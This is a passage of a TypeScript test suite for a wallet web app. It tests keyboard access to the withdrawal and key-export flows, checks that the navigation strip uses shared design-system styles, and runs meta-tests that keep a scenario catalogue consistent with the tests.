        const names = s.tabbables().map((el) => el.getAttribute('id') ?? el.textContent ?? '')
        for (const id of ['send-asset', 'send-destination', 'send-amount']) {
          assert.ok(names.includes(id), `${id} is not reachable by keyboard`)
        }
        assert.ok(names.some((n) => /Review/.test(n)), 'Review is not reachable by keyboard')
        // THE COMMIT IS NOT REACHABLE BEFORE THE INTENT IS ARMED. It is absent rather than
        // disabled — there is nothing to tab past and nothing to click at.
        assert.ok(!names.some((n) => /Send it/.test(n)), 'the commit is tabbable before Review')

        await arm(s, fx.OTHER_ADDRESS, '1')

        // Armed: the commit and the way back are both reachable, and the warning that precedes
        // them is in the document before them rather than only visually above.
        const armedNames = s.tabbables().map((el) => el.textContent ?? '')
        assert.ok(armedNames.some((n) => /Send it/.test(n)), 'the commit is not reachable by keyboard')
        assert.ok(armedNames.some((n) => /Edit/.test(n)), 'the way back is not reachable by keyboard')
        s.before('We do not recognise this address as one of yours', 'Send it now', 'the warning must precede the commit')

        // And it completes by keyboard: focus the commit and press it.
        const commit = s.byRole('button', 'Send it')
        ;(commit as unknown as HTMLElement).focus()
        assert.equal(s.focused(), commit, 'the commit cannot take focus')
        await s.click(commit)
        assert.equal(s.api.matching('POST /v1/withdrawals').length, 1, 'the flow did not complete')
      },
    )
  })

  it('BJ-A11Y-14 ★ T1: the ceremony is traversable and cancel is keyboard-reachable at every stage', async () => {
    fresh()
    for (const status of ['requested', 'cooling_off', 'challenged'] as const) {
      await withScreen(
        page(exportPanel(), '/wallet'),
        {
          url: `${ORIGIN}/wallet`,
          routes: { 'GET /v1/exports': { body: { exports: [fx.keyExport({ status })] } } },
        },
        async (s) => {
          const cancel = s.byRole('button', 'Stop this export')
          assert.ok(
            s.tabbables().includes(cancel),
            `cancel is not in the tab order at stage ${status} — it is the control a person whose ` +
              `factor was stolen has to reach, and it must never be behind a pointer`,
          )
          ;(cancel as unknown as HTMLElement).focus()
          assert.equal(s.focused(), cancel, `cancel cannot take focus at stage ${status}`)
          // The stage list is a real list, so a screen reader announces position and length rather
          // than reading four unrelated lines.
          assert.ok(s.document.querySelector('ol.wt-stages'), `the stages are not a list at ${status}`)
        },
      )
    }
  })
})

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   The strip under the bar. Not a catalogue scenario — doc 22 §3.1 is about what a human can see
   relative to what the API returned, and this is about which STYLESHEET the row on screen is
   wearing. It is here because this is the file that mounts the real shell in a real document, and
   a source-text grep for `<SubNav>` would go green on an import nothing renders.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('the sections strip is the shared one, not a private copy', () => {
  /**
   * The stylesheets, read as text.
   *
   * `src/styles.css` is this app's own layer; `ui.css` is the design system's. Both are read
   * because the claim has two halves and either half alone can be true of a broken state: the
   * shared rules existing while a local copy still overrides them, or the local copy being gone
   * while nothing shared has arrived. `explorer-web/test/tokens.test.ts` makes the same pair of
   * assertions for the form controls, which moved into the design system the same way.
   */
  const CSS = readFileSync(at('src/styles.css'), 'utf8')
  const UI_ROOT = [process.env['CLOUDSFORGE_UI_DIR'], at('../ui')]
    .filter((v): v is string => Boolean(v))
    .find((p) => existsSync(`${p}/packages/ui/src/ui.css`))

  it('renders the shared landmark and shared links, in a real document', async () => {
    fresh()
    // THE ASSERTION THAT WOULD HAVE CAUGHT THE DEFECT THIS CHANGE CLOSES. Measured 2026-08-10:
    // ten frontends drew this row from their own stylesheet, and nine of the ten squeezed their
    // labels and broke them mid-word on a phone with no way to reach the ones past the edge. This
    // repository's copy was the one that did not — and it was still a private copy, which is how
    // the other nine came to exist. What is asserted is that the strip ON SCREEN carries the
    // shared classes, because those are the ones `ui.css` gives `overflow-x: auto` to.
    await withScreen(
      h(MemoryRouter, { initialEntries: ['/'] }, h(AuthProvider, null, h(AppShell))),
      {
        url: `${ORIGIN}/`,
        storage: {
          'cf.accessToken': unsignedToken({ handle: 'savvanis', roles: ['player'] }),
          'cf.refreshToken': 'held-refresh-token',
        },
        routes: {
          'GET /auth/me': { body: { user: { id: 'u1', handle: 'savvanis', roles: ['player'] } } },
        },
      },
      async (s) => {
        await s.settle()

        const strip = s.document.querySelector('nav.cf-subnav')
        assert.ok(strip !== null, 'the sections strip on screen is not the shared `.cf-subnav`')
        assert.ok(
          s.document.querySelector('.cf-subnav .cf-subnav__inner') !== null,
          'the shared landmark has no shared scroll container inside it',
        )

        // Every section link, not "at least one": a partly-adopted strip is a row where some
        // labels wrap and some do not, which is worse than a row where none of them do.
        const links = [...strip.querySelectorAll('a')]
        assert.ok(links.length >= 5, `expected the section links, found ${links.length}`)
        const unshared = links.filter((a) => !a.classList.contains('cf-subnav__link'))
        assert.deepEqual(
          unshared.map((a) => a.textContent),
          [],
          'a section link is not wearing `cf-subnav__link`, so it will not scroll on a phone',
        )

        // And the local prefix is gone from the rendered markup, in both spellings it had.
        assert.equal(s.document.querySelector('[class*="wt-subnav"]'), null, 'a `wt-subnav` survived')
        assert.equal(s.document.querySelector('.is-active'), null, 'the local active modifier survived')

        // The current section is marked with the SHARED modifier. `/` is the index route and
        // `end` is set on it, so exactly one link carries it.
        const current = links.filter((a) => a.classList.contains('cf-subnav__link--current'))
        assert.equal(current.length, 1, `expected one current section, found ${current.length}`)
      },
    )
  })

  it('the shared rules exist and the local copy is gone', () => {
    // Both directions, because either alone is true of a broken state.
    assert.doesNotMatch(CSS, /\.wt-subnav\b/, 'the local sub-nav is back beside the shared one')
    assert.doesNotMatch(CSS, /max-width:\s*76rem/, 'the 1216px measure is back; the token is --cf-max-w')

    if (UI_ROOT === undefined) {
      // A checkout of micro-ui is not guaranteed beside this one — the same condition
      // `test/hosts.test.ts` handles for the registry. Skipping is honest; asserting nothing
      // while claiming to have checked is not.
      return
    }
    const ui = readFileSync(`${UI_ROOT}/packages/ui/src/ui.css`, 'utf8')
    const declared = new Set([...ui.matchAll(/\.(cf-[a-z0-9_-]+)/g)].map((m) => m[1] ?? ''))
    for (const present of ['cf-subnav', 'cf-subnav__inner', 'cf-subnav__link', 'cf-subnav__link--current']) {
      assert.ok(declared.has(present), `.${present} is missing from ui.css; this strip is unstyled`)
    }
  })
})

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   The meta-tests. Doc 22 §3.2.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

/** The estate root, when the sibling repositories are checked out beside this one. */
const ESTATE = new URL('../../', import.meta.url)
const siblingsPresent = existsSync(new URL('identity/src/server.ts', ESTATE))

describe('the catalogue and this file agree', () => {
  const source = readFileSync(at('test/journeys.test.ts'), 'utf8')

  /**
   * The scenarios, without the meta-tests that scan them.
   *
   * The guards below grep for the shapes a scenario must not have — `allowEmpty`, an
   * address-format rule — and every one of those patterns necessarily appears in the guard that
   * forbids it. Scanning the whole file makes each of them fail on a correct file, which is the
   * trap `admin-web/test/render.test.ts` already records ("a guard that fires on its own
   * explanation trains people to delete the explanation"). The split is by the marker below, so a
   * scenario written after the meta-tests would be outside the scanned region — which is why the
   * marker's uniqueness is itself asserted.
   */
  // Split on the describe title, which occurs exactly once — unlike a banner comment, which would
  // occur twice the moment it were also written down as the constant used to find it.
  const MARKER = "describe('the catalogue and this file agree'"
  const scenarios = source.slice(0, source.indexOf(MARKER))

  it('no id appears twice, and no id is both claimed and unclaimed', () => {
    const ids = SCENARIOS.map((s) => s.id)
    assert.deepEqual([...new Set(ids)].sort(), [...ids].sort(), 'an id appears twice in SCENARIOS')
    const overlap = ids.filter((id) => DOC22_UNCLAIMED.includes(id))
    assert.deepEqual(overlap, [], `${overlap.join(', ')} is listed as both covered and uncovered`)
    assert.deepEqual(
      [...new Set(DOC22_UNCLAIMED)].sort(),
      [...DOC22_UNCLAIMED].sort(),
      'an id appears twice in DOC22_UNCLAIMED',
    )
  })

  it('no scenario is marked implemented without a test named for it', () => {
    for (const s of SCENARIOS) {
      if (s.blocked) continue
      // `it('<id> …` — the id is the first token of the test name, so this cannot be satisfied by
      // the id appearing in a comment or in the catalogue import.
      assert.ok(
        new RegExp(`it\\('${s.id}[ ★]`).test(source),
        `${s.id} is in the catalogue as implemented and has no test named for it`,
      )
    }
  })

  it('no test is named for an id the catalogue does not carry', () => {
    // The other direction, and the one that catches a citation drifting: four tests in this estate
    // were recently found grading the WRONG function because their citations had moved.
    const named = [...source.matchAll(/it\('(BJ-[A-Z0-9-]+)[ ★]/g)].map((m) => m[1] as string)
    const known = new Set(SCENARIOS.map((s) => s.id))
    for (const id of new Set(named)) {
      assert.ok(known.has(id), `a test is named ${id}, which is in no catalogue entry`)
    }
    assert.ok(named.length >= SCENARIOS.filter((s) => !s.blocked).length, 'fewer tests than claims')
  })

  it('a scenario whose outcome depends on a server rule carries an ownedBy path', () => {
    // Doc 22 §3.2, mechanically: a scenario whose expected outcome is a refusal, a denial or a 4xx
    // and which carries no `ownedBy` fails. The suite refuses to run rather than reporting green.
    const REFUSAL = /\b(refus|denie|denial|reject|409|403|4xx|spent|enrol|not withdrawable|will not mint)\w*/i
    for (const s of SCENARIOS) {
      if (s.blocked) continue
      if (!REFUSAL.test(s.what)) continue
      assert.ok(
        s.ownedBy,
        `${s.id} turns on a server-side refusal and names no test that owns it. Doc 22 §3.2: ` +
          `"a path, resolvable by grep, in the service that enforces the rule".`,
      )
      assert.match(
        s.ownedBy.path,
        /^[a-z-]+\/src\/[\w./-]+\.ts$/,
        `${s.id}'s ownedBy must be <repo>/src/<file>.ts, got ${s.ownedBy.path}`,
      )
    }
  })

  it(
    'every ownedBy path exists in the estate and its grep string matches',
    {
      // A REAL skip, reported as skipped. Six tests in this estate were recently found `return`ing
      // instead of skipping, so they reported as PASSED against work they had not done.
      skip: siblingsPresent
        ? false
        : 'the sibling repositories are not checked out beside this one, so the cited files ' +
          'cannot be read. This is the state in CI, whose ci.yml checks out only micro-ui.',
    },
    () => {
      for (const s of SCENARIOS) {
        if (!s.ownedBy) continue
        const file = new URL(s.ownedBy.path, ESTATE)
        assert.ok(existsSync(file), `${s.id} cites ${s.ownedBy.path}, which does not exist`)
        const text = readFileSync(file, 'utf8')
        assert.ok(
          text.includes(s.ownedBy.grep),
          `${s.id} cites ${s.ownedBy.path} for "${s.ownedBy.grep}", which is not in that file — ` +
            `the citation has drifted, and a scenario pointing at the wrong owner is a scenario ` +
            `nobody can follow to the rule it depends on`,
        )
      }
    },
  )

  it('every blocked scenario names its blocker, and no blocker is a shrug', () => {
    for (const s of SCENARIOS) {
      if (!s.blocked) continue
      assert.ok(s.blocked.length > 80, `${s.id}'s blocker is too short to be a reason`)
      assert.ok(
        /doc 22|§|does not exist|no UI|tier 3|micro-beacon|not installed|no signer|no policy|no retry|serves no|finds nothing|carries no|consults no|nothing consults|no producer|there is no|has none|no dependency|no route/i.test(
          s.blocked,
        ),
        `${s.id}'s blocker does not name a fact about the estate: ${s.blocked}`,
      )
    }
  })

  it('every caveat names what is NOT asserted, and why it cannot be', () => {
    // A caveat is the difference between "implemented" and "implemented, and here is the half that
    // is missing". One that said only "partly" would be worse than none, because it would look
    // like a decision had been recorded.
    for (const s of SCENARIOS) {
      if (!s.caveat) continue
      assert.ok(!s.blocked, `${s.id} is both blocked and caveated; pick one`)
      assert.ok(s.caveat.length > 120, `${s.id}'s caveat is too short to be a reason`)
      assert.ok(
        /because|serves no|has no|cannot|nothing (in the estate |)publishes|tier 3|is a property of|is not a surface|holds four|worse than/i.test(
          s.caveat,
        ),
        `${s.id}'s caveat does not say why the missing half is missing: ${s.caveat}`,
      )
    }
  })

  it('nothing here is tier 3 and implemented — tier 3 lives in micro-beacon', () => {
    for (const s of SCENARIOS) {
      if (s.tier !== 'T3') continue
      assert.ok(s.blocked, `${s.id} is tier 3 and not blocked; doc 22 §4 puts tier 3 in beacon`)
    }
  })

  it('every unblocks entry names a doc 22 §8 blocker and a file in THIS repository', () => {
    for (const s of SCENARIOS) {
      if (!s.unblocks) continue
      assert.ok(!s.blocked, `${s.id} claims to be unblocked and is also blocked`)
      assert.match(s.unblocks.was, /§8\.[12]|§6\.19|§6\.20/, `${s.id}'s "was" names no doc 22 section`)
      // The file that removed the blocker has to be real, or this is a claim about work that was
      // not done — which is the shape of every stale citation this estate has had to correct.
      const cited = s.unblocks.by.match(/src\/[\w./-]+\.tsx?/)
      assert.ok(cited, `${s.id}'s "by" cites no source file: ${s.unblocks.by}`)
      assert.ok(existsSync(at(cited[0])), `${s.id} says ${cited[0]} removed the blocker; it does not exist`)
    }
  })

  it('no scenario in this file rendered nothing', () => {
    // `allowEmpty` turns off the assertion that makes every scenario worth running. No scenario
    // here has an empty render as its subject, so its presence would mean a scenario had been
    // walked past a red result rather than fixed.
    // TWICE, not once: the `describe` call, and the constant a few lines below it that names the
    // call in order to find it. A marker written into the file it searches always occurs at least
    // twice, and `indexOf` takes the FIRST — which is the `describe`, because the constant is
    // inside its body. Asserting "once" was the previous version of this line, and it failed on a
    // correct file for that reason.
    assert.equal(source.split(MARKER).length - 1, 2, 'the meta-test marker moved or multiplied')
    assert.ok(
      source.indexOf(MARKER) < source.lastIndexOf(MARKER),
      'the marker constant is no longer inside the block it delimits',
    )
    assert.ok(scenarios.length > 1000, 'the scenario region did not split out')
    assert.ok(!/allowEmpty/.test(scenarios), 'a scenario disabled the did-anything-render assertion')
    // `mountedText` replaces it with something stricter and is allowed, but only where a screen is
    // genuinely shorter than forty characters — one place, and it is named.
    // TWO, and a third is a decision somebody has to make here. Both are screens that are
    // genuinely shorter than forty characters and legitimately so — SignOutPage's thirty-four and
    // VerifyEmailPage's thirty-five, each a spinner and a live region on a page the browser is
    // about to leave. The count is pinned rather than the rule dropped, because `mountedText` is
    // the one escape from the assertion that makes every scenario worth running.
    const replaced = [...scenarios.matchAll(/mountedText:/g)]
    assert.equal(replaced.length, 2, 'the forty-character rule was replaced somewhere new')
  })

  it('no scenario asserts a business rule', () => {
    // Doc 22 §3, kept mechanical. These are the shapes a client-side rule assertion takes, and
    // 14 §11 is why: a game client withheld four SKUs from its UI while the payment routes stayed
    // live, and a client-side test of the hidden catalogue would have passed against the defect.
    const banned: ReadonlyArray<readonly [RegExp, string]> = [
      [/isValidAddress|validateAddress|addressPattern/i, 'an address-format rule'],
      [/passwordPolicy|minLength|strengthOf/i, 'a credential rule'],
      [/\bLIMIT_|dailyLimit|withdrawalLimit/i, 'a limit rule'],
    ]
    for (const [pattern, what] of banned) {
      assert.ok(!pattern.test(scenarios), `this file asserts ${what}, which is the server's to enforce`)
    }
  })
})
